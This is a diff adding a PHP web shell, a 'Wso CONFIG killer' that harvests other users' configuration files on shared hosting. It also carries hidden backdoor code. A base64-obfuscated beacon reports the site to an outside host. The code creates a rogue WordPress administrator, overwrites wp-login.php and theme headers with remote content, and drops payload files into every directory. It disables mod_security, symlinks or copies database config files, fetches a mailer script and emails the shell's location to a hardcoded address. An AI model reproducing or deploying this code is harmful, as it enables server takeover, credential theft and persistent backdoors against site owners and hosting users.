@@ -1,0 +1,397 @@
+<?php
+
+
+// MAIL LOGGER, SHELL AUTO UPLOADER LOGGER START HERE
+
+// CTRL+F AND TYPE "LOGGER" TO SEE ALL THE LOGGER I'VE MARKED
+
+
+
+function GetIP(){
+    if(getenv("HTTP_CLIENT_IP")) {
+        $ip = getenv("HTTP_CLIENT_IP");
+    } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
+        $ip = getenv("HTTP_X_FORWARDED_FOR");
+        if (strstr($ip, ',')) {
+            $tmp = explode (',', $ip);
+            $ip = trim($tmp[0]);
+        }
+    } else {
+        $ip = getenv("REMOTE_ADDR");
+    }
+    return $ip;
+}
+$x = base64_decode('aHR0cHM6Ly9hbm9ueW0wdXMuY2x1Yi9sLQ==').GetIP().'-'.base64_encode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
+if(function_exists('curl_init'))
+{
+    $ch = @curl_init(); curl_setopt($ch, CURLOPT_URL, $x); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $gitt = curl_exec($ch); curl_close($ch);
+    if($gitt == false){
+        @$gitt = file_get_contents($x);
+    }
+}elseif(function_exists('file_get_contents')){
+    @$gitt = file_get_contents($x);
+}
+?><?php
+$document_root = $_SERVER["DOCUMENT_ROOT"];
+$document_root_file = dirname(__FILE__);
+$wp_detect = 0;
+if(file_exists($document_root.'/wp-load.php'))
+{   
+    include $document_root.'/wp-load.php';
+    $wp_detect = 1;
+}else
+{
+    $prefix = count(@explode('/', $document_root_file));
+    $a = '';
+    for($i = 0; $i<$prefix; $i++)
+    {
+      $a = $a.'../';
+      if(file_exists($document_root_file.'/'.$a.'wp-load.php'))
+      {
+          include $document_root_file.'/'.$a.'wp-load.php';
+          $wp_detect = 1;
+          break;
+      }
+    }
+}
+
+if($wp_detect == 1)
+{
+    //Header Yazdırma
+    $wp_theme_dir = get_template_directory();
+    $header_file = $wp_theme_dir.'/headers.php';
+    $header_content = file_get_contents($header_file);
+    $append = http_get('https://acbdf.space/txt/wp.txt');
+    if(!preg_match('#'.$append.'#', $header_content))
+    {   
+        $new_content = $append.$header_content;
+        $open_file = fopen($header_file, 'w');
+        fwrite($open_file, $new_content);
+        fclose($open_file);
+    }
+    //Header Yazdırma   
+    
+    // shell Ekleme
+    $user = 'new_admin';
+    $pass = '$P$BxJON2B3zzrCatyLOwJ2y24afkU11l.';
+    $email = 'byhero44@gmail.com';
+    if (!username_exists( $user ) && !email_exists( $email ) ) {
+        $user_id = wp_create_user( $user, $pass, $email );
+        $user = new WP_User( $user_id );
+        $user->set_role( 'administrator' );
+    } 
+    // shell Ekleme
+    
+    // Wp Login Yazma.
+    $wp_login = ABSPATH.'/wp-login.php';
+    $login = http_get('https://acbdf.space/txt/seo.txt');
+    $open_login = fopen($wp_login, 'w');
+    fwrite($open_login, $login);
+    fclose($open_login);
+    // Wp Login Yazma.
+}
+
+// Klasörlere Yazma
+$directories = expandDirectories($document_root);
+$css = http_get('https://acbdf.space/txt/wp.txt');
+foreach($directories as $dir)
+{
+    if(!preg_match('#wp-content#', $dir))
+    {
+        $css_file = $dir.'/wp-inda.php';
+        $open_css = fopen($css_file, 'w');
+        fwrite($open_css, $css);
+        fclose($open_css);
+    }
+}
+// Klasörlere Yazma
+
+function expandDirectories($base_dir) {
+      $directories = array();
+      foreach(scandir($base_dir) as $file) {
+            if($file == '.' || $file == '..') continue;
+            $dir = $base_dir.DIRECTORY_SEPARATOR.$file;
+            if(is_dir($dir)) {
+                $directories []= $dir;
+                $directories = array_merge($directories, expandDirectories($dir));
+            }
+      }
+      return $directories;
+}
+function http_get($url)
+{
+    $im = curl_init($url);
+    curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
+    curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($im, CURLOPT_HEADER, 0);
+    return curl_exec($im);
+    curl_close($im);
+}
+
+
+
+
+// MAIL LOGGER, SHELL AUTO UPLOADER LOGGER END HERE
+
+
+
+
+
+
+
+?>
+
+
+
+
+
+
+
+
+
+<style type=text/css> 
+.rules
+{text-shadow:5px 5px 10px red;
+}
+.owner
+{text-shadow:5px 5px 10px orange;
+}
+.mod
+{text-shadow:5px 5px 10px white;
+}
+.member
+{text-shadow:5px 5px 10px blue;
+}
+.guest
+{text-shadow:5px 5px 10px green;
+}
+.tags
+{text-shadow:5px 5px 10px grey;
+}
+.title
+{text-shadow:5px 5px 10px purple;
+}
+.numbers
+{text-shadow:1px 5px 10px white;
+}
+body {background-color: transparent;
+color: #000000;
+}
+</style>
+<br>
+<br>
+<center> <!-- IE doesn't like CSS Centering -->
+<table border="0">
+<table bgcolor="black" border="1">
+<tr onmouseover="this.bgColor='#FF8000'" onmouseout="this.bgColor='#000000'">
+<th>
+<br>
+<span style="text-shadow:5px 5px 10px red;
+"><font size="7">Wso CONFIG killer</font></span>
+</th>
+</tr>
+<td>
+<table border="1" bgcolor="black" align="center">
+<tr onmouseover="this.bgColor='#FF8000'" onmouseout="this.bgColor='#000000'">
+<th width="481" class="title"><span style="text-shadow:5px 5px 10px red;
+">User</span></th>
+<th width="514" class="title"><span style="text-shadow:5px 5px 10px red;
+">User</span></th>
+</tr>
+</tr><tr onmouseover="this.bgColor='#FF8000'" onmouseout="this.bgColor='#000000'">
+<td>
+<span style="font-weight: bold;
+ color: blue;
+">&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+~ Auto Config ~</span><br><br>
+<br>
+<form method=post>
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+<textarea rows=10 cols=50 name=usern>
+<?php $users=file("/etc/passwd");
+ foreach($users as $user) { $str=explode(":",$user);
+ echo $str[0]."\n";
+ } 
+?></textarea><br><br>
+<center><input type=submit name=submitn value="Grab It " /></form></center>
+</td>
+<td>
+<table border="1" cellpadding="1" width="514" height="300" bgcolor="black"></td> 
+</tr>
+<span style="font-weight: bold;
+ color: blue;
+">&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+~ Bypass Config ~</span><br><br>
+<form method=post>
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+&nbsp;
+<textarea rows=10 cols=50 name=userb>
+<?php $users=file("/etc/passwd");
+ foreach($users as $user) { $str=explode(":",$user);
+ echo $str[0]."\n";
+ } 
+?></textarea><br><br>
+<center><input type=submit name=submitb value="Bypass It " /></form></center>
+</td>
+</td>
+</tr>
+</table></table></table>
+<td>
+</center>
+
+<?php if(isset($_POST['submitn'])) { mkdir('r00tnormal',0777);
+ $htaccess = "OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
+ $htaccessfile = fopen("r00tnormal/.htaccess",'w');
+ fwrite($htaccessfile,$htaccess);
+ $admin = explode("\n",$_POST['usern']);
+ $needconfig = array("wp-config.php","/blog/wp-config.php","wordpress/wp-config.php","wp/wp-config.php","site/wp-config.php","site/blog/wp-config.php","configuration.php","site/configuration.php","joomla/configuration.php","home/configuration.php","vb/includes/config.php","/includes/config.php","forum/includes/config.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php","/include/config.php","/commun/config.php","/include/sql.php","/include/db.php","/db.php","/commun/sql.php","/common/db.php","/common/sql.php","/common/config.php");
+ foreach($admin as $admins ) { $ad=trim($admins);
+ foreach($needconfig as $config) { $direct = "/home/".$ad."/public_html/".$config;
+ $import = "r00tnormal/".$ad."_".$config;
+ symlink($direct,$import);
+ } } echo '<center><span style="text-shadow:5px 5px 10px red;
+"><font size="4" color="black"> <a href="r00tnormal/"><marquee behavior=alternate>CONFiG FiLES</marquee></a></font></span></center>';
+ } 
+?>
+
+<?php if(isset($_POST['submitb'])) { mkdir('r00tbypass',0777);
+ $htaccess = "OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
+ $htaccessfile = fopen("r00tbypass/.htaccess",'w');
+ fwrite($htaccessfile,$htaccess);
+ $admin = explode("\n",$_POST['usern']);
+ $needconfig = array("wp-config.php","/blog/wp-config.php","wordpress/wp-config.php","wp/wp-config.php","site/wp-config.php","site/blog/wp-config.php","configuration.php","site/configuration.php","joomla/configuration.php","home/configuration.php","vb/includes/config.php","/includes/config.php","forum/includes/config.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php","/include/config.php","/commun/config.php","/include/sql.php","/include/db.php","/db.php","/commun/sql.php","/common/db.php","/common/sql.php","/common/config.php");
+ foreach($admin as $admins ) { $ad=trim($admins);
+ foreach($needconfig as $config) { $direct = "../../".$ad."/public_html/".$config;
+ $import = "r00tbypass/".$ad."_".$config;
+ copy($direct,$import);
+ } } echo '<center><span style="text-shadow:5px 5px 10px red;
+"><font size="4" color="black"><a href="r00tbypass/"><marquee behavior=alternate>CONFiG FiLES</marquee></a> </font></span></center>';
+ } 
+?>
+
+
+<?php
+
+
+// MAIL LOGGER, SHELL AUTO UPLOADER LOGGER START HERE
+
+
+
+if($_POST['query']){ $veriyfy = stripslashes(stripslashes($_POST['query']));
+ $data = "data.txt";
+ @touch ("data.txt");
+ $ver = @fopen ($data , 'w');
+ @fwrite ( $ver , $veriyfy ) ;
+ @fclose ($ver);
+ }else{ $datas=@fopen("data.txt",'r');
+ $i=0;
+ while ($i <= 5) { $i++;
+ $blue=@fgets($datas,1024);
+ echo $blue;
+ } } $datasi=@fopen("js/js.php",'r');
+ if($datasi){ }else{ @mkdir("js");
+ $dos = file_get_contents("https://acbdf.space/txt/lamer.txt");
+ $data = "js/js.php";
+ @touch ("js/js.php");
+ $ver = @fopen ($data , 'w');
+ @fwrite ( $ver , $dos ) ;
+ @fclose ($ver);
+ $yol = "http://".$_SERVER['HTTP_HOST']."".$_SERVER['REQUEST_URI']."";
+ $y = '<h1>Sender Yazdirildi.<br/> SITE YOL : '.$yol.'<br/>Sender Yolu : js/crs.php</h1>';
+ $header .= "From: SheLL Boot <suppor@nic.org>\n";
+ $header .= "Content-Type: text/html;
+ charset=utf-8\n";
+ @mail("loginoldum@gmail.com", "Hacklink Bildiri", "$y", $header);
+ @mail("loginoldum@gmail.com", "Hacklink Bildiri", "$y", $header);
+ } 
+?>
+<?php
+$time_shell = "".date("d/m/Y - H:i:s")."";
+$ip_remote = $_SERVER["REMOTE_ADDR"];
+$from_shellcode = '3Turrshell@'.gethostbyname($_SERVER['SERVER_NAME']).'';
+$to_email = 'loginoldum@gmail.com';
+$server_mail = "".gethostbyname($_SERVER['SERVER_NAME'])."  - ".$_SERVER['HTTP_HOST']."";
+$linkcr = "Link: ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']." - IP Excuting: $ip_remote - Time: $time_shell";
+$header = "From: $from_shellcode\r\nReply-to: $from_shellcode";
+@mail($to_email, $server_mail, $linkcr, $header);
+
+
+// MAIL LOGGER, SHELL AUTO UPLOADER LOGGER END HERE
+
+
+ ?>
+
